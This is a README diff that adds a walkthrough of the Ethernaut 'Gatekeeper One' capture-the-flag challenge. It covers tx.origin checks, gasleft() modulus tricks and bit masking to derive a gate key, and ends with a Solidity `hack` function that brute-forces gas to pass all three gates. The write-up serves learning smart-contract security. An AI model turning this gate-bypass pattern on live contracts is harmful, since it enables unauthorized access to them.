@@ -396,6 +396,79 @@ Now, let's solve this challenge:
 
 For reference -> [Challenge](./questions/13.Gatekeeper_One.sol) | [Solution](./answers/13.Gatekeeper_One.sol)
 
+This challenge was quite difficult to understand in first go, but that's ok it's part of the process. you need to get familiar with certain topics like:
+
+- Bit masking
+- tx.origin vs msg.sender
+- opcodes
+- what is gasleft()
+
+Coming to the question, one need to break 3 gates in order to pass this challenge.
+
+`GateOne`: You must have seen it before and we know that in order to break it, all we have to do is call the `enter` function from some other contract.
+
+```solidity
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+```
+
+`GateTwo`: This gonna use up some brute force technique, mainly using `gasleft()` in a way such that we meet the required condition.
+
+```solidity
+    modifier gateTwo() {
+        require(gasleft() % 8191 == 0);
+        _;
+    }
+```
+
+`GateThree`: Need an understanding of conversion between uint and bytes, bit masking and some other math stuff!
+
+```solidity
+    modifier gateThree() {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+```
+
+To solve the third gate, you can see our key is hidden in last condition which is `uint16(uint160(tx.origin))`. Here, `tx.origin` will be our wallet address, let's suppose mine is `0x9aFE8fCbc8465b73319520AFEDba0C0179f26D97` which is 20 bytes (each byte covering up 2 characters)
+
+Thus, according to the last condition:
+
+```typescript
+    uint32((uint64(_gateKey))) == uint16((uint160(tx.origin))) ==  0x6D97 == 0x00006D97
+                                                                   uint16      uint32
+```
+
+***Note: when a 20 bytes address is converted into a lower bytes, the left side bytes be the one to be removed.***
+
+Now let's go through the first part of gate three, the condition says -> `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))` which means our key should be same in both uint16 and uint32. Thus, `0x6D97 == 0x00006D97` which is true.
+
+Here comes the 2nd part of gate three, the condition says -> `uint32(uint64(_gateKey)) != uint64(_gateKey)` which means our uint32 key shouldn't be equal to uint64 key. The only way it could be possible if we mask our key of 8 bytes (i.e uint64) with `0xFFFFFFFF0000FFFF` which will satisfy that condition.
+After masking, our key now is `0xEDba0C0100006D97` which is 8 bytes. Thus, we know with what to mask our key now -> `0xFFFFFFFF0000FFFF`
+
+At last, deploy the contract provided in [Solution](./answers/13.Gatekeeper_One.sol) file. Here's the main `hack` function and a detailed reason and solution in tackling the `gateTwo`:
+
+```solidity
+    function hack(uint start, uint end) public{
+        // Now what's we doing here, just using a brute force technique
+        // Here 8191 will be the multiplied by any number greater than 3 such that enough gas is provided for this function to call, and then 150 is added, just to make it more precise for some gasleft context, and then hit and trial thing is done with for loop iterations!!
+
+        // Make sure to try different value of 'start' and 'end' ranging from 0 to 500
+        for(uint i = start; i < end; i++){
+            (bool result, bytes memory data) = address(keeperOne).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", gateKey));
+            if (result){
+                break;
+            }
+        }
+    }
+```
+
+Call the `hack` function and submit the instance...Cheers!
+
 ## Contributing
 
 Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
